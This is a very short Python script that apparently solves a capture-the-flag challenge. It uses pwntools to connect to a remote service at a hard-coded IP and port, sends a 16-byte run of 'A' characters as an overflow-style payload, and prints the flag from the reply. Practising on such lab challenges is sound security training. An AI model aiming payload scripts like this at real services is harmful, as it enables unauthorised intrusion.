#!/usr/bin/env python3
from pwn import *

r = remote("34.78.240.11", 55342)
r.recv()
r.sendline(b"A"*16)
flag = r.recv().decode().strip().split()[-1]
print(flag)
